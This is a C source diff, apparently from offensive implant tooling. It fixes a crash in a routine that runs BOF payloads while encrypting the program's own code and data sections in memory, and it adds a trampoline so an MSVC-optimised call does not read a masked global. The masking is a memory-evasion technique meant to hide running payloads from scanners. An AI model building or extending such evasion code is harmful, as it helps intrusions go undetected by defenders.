@@ -173,17 +173,34 @@ static BOOL bw_page_usable(void * p, DWORD * prot)
 
 /* restore the recorded protections; plain C - only ever called from the
  * window teardown, after the exit stub put .text back (so IAT works) */
-static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
-{
-	int i;
-	DWORD old = 0;
-
-	for (i = 0; i < n; i++) {
-		if (i == text_idx)
-			continue;
-		VirtualProtect(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
+	static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx)
+	{
+		int i;
+		DWORD old = 0;
+	
+		for (i = 0; i < n; i++) {
+			if (i == text_idx)
+				continue;
+			VirtualProtect(blocks[i].ptr, blocks[i].len, blocks[i].orig_prot, &old);
+		}
 	}
-}
+
+	/* After the mask loop, .data/.rdata (and the IAT) are ciphertext. MSVC /O1
+	 * turned `enter = g_bw_stubs + OFF; enter();` into `call [g_bw_stubs]`
+	 * which reloads the global from .data AFTER the mask (live dump: RIP in
+	 * bofwin_window at the call, read of 0xffffffffffffffff). This trampoline
+	 * is a separate unoptimized function so the pointer arrives in rcx and
+	 * is called directly - no .data reload. */
+#if defined(_MSC_VER)
+#pragma optimize("", off)
+#endif
+	static void bw_call_enter(void (*fn)(void))
+	{
+		fn();
+	}
+#if defined(_MSC_VER)
+#pragma optimize("", on)
+#endif
 
 /* Snapshot the whole image (header page + every section except the
  * unwind/reloc tables) plus tracked heap records outside the image. The
@@ -542,9 +559,9 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	BW_BLOCK * blocks;
 	int nblocks, text_idx, i;
 	unsigned char key[16];
-	HANDLE timer = NULL;
-	void (*enter)(void);
-	BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
+		HANDLE timer = NULL;
+		void (*enter_fn)(void);
+		BOOL (*pVP)(void *, SIZE_T, DWORD, DWORD *);
 	BOOL (*pFlush)(void *, const void *, SIZE_T);
 	unsigned int * k = (unsigned int *)key;
 
@@ -573,8 +590,11 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 		return FALSE;
 	BW_TRACE("snapshot+rng done");
 
-	pVP = VirtualProtect;
-	pFlush = FlushInstructionCache;
+		pVP = VirtualProtect;
+		pFlush = FlushInstructionCache;
+		/* capture the stub address NOW - g_bw_stubs lives in .data and is
+		 * ciphertext after the mask loop. */
+		enter_fn = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
 
 	ctx->state = BW_STATE_OPEN;
 	ctx->rest_done = 0;
@@ -629,8 +649,7 @@ BOOL bofwin_window(void (*entry)(void *, int), void * args, int alen, DWORD watc
 	 * page, stub page. enter_stub flips .text to RW, masks it (last block),
 	 * enters the BOF; the BOF's ret -> exit_stub restores .text + RX and
 	 * returns into THIS frame. */
-	enter = (void (*)(void))(g_bw_stubs + BW_ENTER_OFF);
-	enter();
+		bw_call_enter(enter_fn);
 	ctx->phase = 4; /* exit stub returned to this frame - no trace here,
 	                 * .rdata (and the IAT) is still ciphertext */
 
